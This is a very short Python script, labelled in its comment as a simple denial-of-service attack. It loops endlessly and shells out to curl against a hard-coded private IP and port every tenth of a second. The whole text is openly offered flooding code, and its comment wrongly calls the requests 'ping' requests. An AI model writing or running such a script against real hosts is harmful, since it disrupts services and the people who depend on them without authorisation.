
import os
import time

target_ip = '192.168.140.118:6000'

# Simple DoS attack by sending continuous ping requests
while True:
    print('sending..........')
    os.system(f'curl {target_ip}')
    time.sleep(0.1)

